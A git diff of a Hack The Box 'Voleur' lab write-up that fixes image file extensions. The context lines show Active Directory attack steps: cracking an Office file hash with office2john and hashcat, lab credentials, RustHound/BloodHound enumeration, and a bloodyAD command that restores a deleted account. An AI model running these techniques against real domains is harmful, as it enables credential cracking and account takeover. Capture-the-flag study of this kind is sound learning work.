@@ -186,7 +186,7 @@ SMB         10.129.232.130  445    DC               [+] File '/First-Line Suppor
 ```
 Unfortunately, this file has password blocked. So we must find out its password:
 
-![Upgrade_Notice.pdf](assets/image/htb/voleur/2026-11-20_11-35){: w="700" }
+![Upgrade_Notice.pdf](assets/image/htb/voleur/2026-11-20_11-35.png){: w="700" }
 
 Okey, a password, so I fastly think to `hashcat` :D. But first of all we need to convert that password to a format which hascat can understand. I will use `office2john` tool:
 ```
@@ -200,7 +200,7 @@ Access_review.xlsx:$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*
 $office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c:football1
 ```
 
-![Upgrade_Notice.pdf](assets/image/htb/voleur/2026-11-20_12-23){: w="700" }
+![Upgrade_Notice.pdf](assets/image/htb/voleur/2026-11-20_12-23.png){: w="700" }
 
 ## P2
 `As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor / HollowOct31Nyt`<br>
@@ -246,7 +246,7 @@ RustHound-CE Enumeration Completed at 21:48:43 on 11/19/26! Happy Graphing!
 ```
 Cool ! Now import all rusthound result to bloodhound GUI and start your detective job !
 
-![Upgrade_Notice.pdf](assets/image/htb/voleur/2026-11-20_15-04){: w="700" }
+![Upgrade_Notice.pdf](assets/image/htb/voleur/2026-11-20_15-04.png){: w="700" }
 
 ```
 └─$ nxc smb 10.129.232.130 -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -k 
@@ -319,7 +319,7 @@ Mode                 LastWriteTime         Length Name
 ## P3 & P4
 Okey now we have an initial shell. I have tried to run my own script as well as winPEAS script but nothing interesting here. So I try to come back to with `Access_review.xlsx` file. From here we can see that there is a deleted account name `todd.wolfe` with its reseted password `NightT1meP1dg3on14`. So we can restore it by using `bloodyAD` like below:
 
-![Upgrade_Notice.pdf](assets/image/htb/voleur/2026-11-24_20-42){: w="700" }
+![Upgrade_Notice.pdf](assets/image/htb/voleur/2026-11-24_20-42.png){: w="700" }
 
 ```
 └─$ bloodyAD --host dc.voleur.htb --dc-ip 10.129.232.130 -d voleur.htb -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -k ccache=svc_ldap.ccache set restore 'todd.wolfe'
